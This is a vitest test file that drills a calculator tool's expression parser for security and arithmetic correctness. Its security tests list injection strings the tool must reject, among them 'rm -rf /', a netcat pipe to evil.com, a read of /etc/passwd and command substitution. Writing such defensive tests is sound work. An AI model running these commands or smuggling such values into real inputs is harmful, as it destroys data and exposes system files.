// Negative drills for Iter 76 (2026-05-17): CalculatorTool security
// + arithmetic-parser correctness drill.
//
// Pre-fix: CalculatorTool has 3 dispatcher-level tests (executes /
// rejects-non-arithmetic / role auth). The PARSER itself — the
// only piece of openclaw-components code with security-critical
// expression evaluation — has no direct drill. Charset regex is
// the front-line defense; if it ever flexes the parser is exposed.
//
// Two surfaces drilled:
//   A. SECURITY — charset regex rejects every dangerous input shape
//      (no eval, no JS identifiers, no shell metachars).
//   B. CORRECTNESS — parser respects precedence, parens, unary
//      minus, decimals, whitespace; rejects malformed shapes;
//      handles edge cases (deep nesting, divide-by-zero → NaN).

import { describe, it, expect } from "vitest";
import { calculatorTool } from "./calculator-tool";

const CTX = {
  requestId: "r", sessionId: "s", userId: "u", tenantId: "t",
};

async function evalExpr(expr: string): Promise<number> {
  const out = await calculatorTool.execute({ expression: expr }, CTX);
  return (out as { result: number }).result;
}

async function rejects(expr: string): Promise<boolean> {
  try {
    await calculatorTool.execute({ expression: expr }, CTX);
    return false;
  } catch {
    return true;
  }
}

describe("Iter 76 — CalculatorTool security (P1)", () => {
  it("BACKDOOR: rejects JavaScript identifiers (Math, global, process)", async () => {
    expect(await rejects("Math.PI")).toBe(true);
    expect(await rejects("global.process")).toBe(true);
    expect(await rejects("process.exit(1)")).toBe(true);
    expect(await rejects("require('fs')")).toBe(true);
  });

  it("BACKDOOR: rejects shell / command-substitution metacharacters", async () => {
    expect(await rejects("1+1; rm -rf /")).toBe(true);
    expect(await rejects("1+1 | nc evil.com 80")).toBe(true);
    expect(await rejects("1+1 && cat /etc/passwd")).toBe(true);
    expect(await rejects("$(reboot)")).toBe(true);
    expect(await rejects("`echo pwned`")).toBe(true);
  });

  it("BACKDOOR: rejects eval-style payloads", async () => {
    expect(await rejects("alert('x')")).toBe(true);
    expect(await rejects("function(){return 1}")).toBe(true);
    expect(await rejects("(function(){})()")).toBe(true);  // parens ok but body chars fail
    expect(await rejects("[1,2,3].map")).toBe(true);
    expect(await rejects("'1+1'")).toBe(true);
  });

  it("BACKDOOR: rejects unicode whitespace / homoglyph digits", async () => {
    // 　 ideographic space, U+FF11 fullwidth digit 1 — not in [0-9].
    expect(await rejects("1　1")).toBe(true);
    expect(await rejects("１+２")).toBe(true);
  });

  it("BACKDOOR: rejects null bytes + control chars", async () => {
    expect(await rejects("1+\x001")).toBe(true);
    expect(await rejects("1+\x1b1")).toBe(true);
  });
});

describe("Iter 76 — Arithmetic parser correctness (P1)", () => {
  it("honors operator precedence (* before +)", async () => {
    expect(await evalExpr("1+2*3")).toBe(7);   // not 9
    expect(await evalExpr("10-2*3")).toBe(4);  // not 24
    expect(await evalExpr("6/2+1")).toBe(4);   // not 2
  });

  it("honors parentheses to override precedence", async () => {
    expect(await evalExpr("(1+2)*3")).toBe(9);
    expect(await evalExpr("2*(3+4)")).toBe(14);
    expect(await evalExpr("((1+2)*3)+1")).toBe(10);
  });

  it("unary minus + plus handled (-5+3 = -2)", async () => {
    expect(await evalExpr("-5+3")).toBe(-2);
    expect(await evalExpr("+5+3")).toBe(8);
    expect(await evalExpr("-(2+3)")).toBe(-5);
    expect(await evalExpr("--5")).toBe(5);    // double negation
  });

  it("decimal numbers + arithmetic", async () => {
    expect(await evalExpr("0.5+0.5")).toBe(1);
    expect(await evalExpr("1.5*2")).toBe(3);
    expect(await evalExpr("0.1+0.2")).toBeCloseTo(0.3, 10);
  });

  it("whitespace tolerated everywhere", async () => {
    expect(await evalExpr(" 1 + 2 ")).toBe(3);
    expect(await evalExpr("1\t+\t2")).toBe(3);
    expect(await evalExpr("(  1  +  2  ) * 3")).toBe(9);
  });

  it("empty / whitespace-only input rejected", async () => {
    expect(await rejects("")).toBe(true);
    expect(await rejects("   ")).toBe(true);
    expect(await rejects("\t\n")).toBe(true);
  });

  it("unbalanced parens rejected", async () => {
    expect(await rejects("(1+2")).toBe(true);
    expect(await rejects("1+2)")).toBe(true);
    expect(await rejects(")(")).toBe(true);
    expect(await rejects("((1+2)")).toBe(true);
  });

  it("trailing operator rejected", async () => {
    expect(await rejects("1+")).toBe(true);
    expect(await rejects("1+2*")).toBe(true);
    expect(await rejects("*1+2")).toBe(true);  // leading binary op
  });

  it("division by zero → Infinity → REJECTED (not finite)", async () => {
    expect(await rejects("1/0")).toBe(true);
    expect(await rejects("0/0")).toBe(true);     // → NaN → rejected
    expect(await rejects("5/(2-2)")).toBe(true);  // hidden div-by-zero
  });

  it("very deep nesting handled without uncaught stack overflow", async () => {
    // 200 levels of parens. The parser is recursive-descent — must
    // either succeed or throw a controlled Error, never crash the
    // Node process with an uncaught stack overflow.
    const open = "(".repeat(200);
    const close = ")".repeat(200);
    const expr = `${open}1${close}`;
    let threw: unknown = null;
    try {
      const result = await evalExpr(expr);
      expect(result).toBe(1);
    } catch (e) {
      threw = e;
    }
    // Either it succeeded (result === 1, asserted above) OR it
    // threw a controlled Error. Both are acceptable — what's NOT
    // acceptable is a runtime crash that kills the worker. The
    // existence of this control-flow proves the bound.
    if (threw !== null) {
      expect(threw).toBeInstanceOf(Error);
    }
  });

  it("expression with only digits + no operator: rejected as malformed if multi-digit literal is invalid", async () => {
    // Bare numbers are valid expressions.
    expect(await evalExpr("42")).toBe(42);
    expect(await evalExpr("3.14")).toBe(3.14);
  });

  it("double operators (1+*2) rejected", async () => {
    expect(await rejects("1+*2")).toBe(true);
    expect(await rejects("1**2")).toBe(true);
    expect(await rejects("1//2")).toBe(true);
  });

  it("multi-decimal-point number rejected (1.2.3)", async () => {
    expect(await rejects("1.2.3")).toBe(true);
  });
});
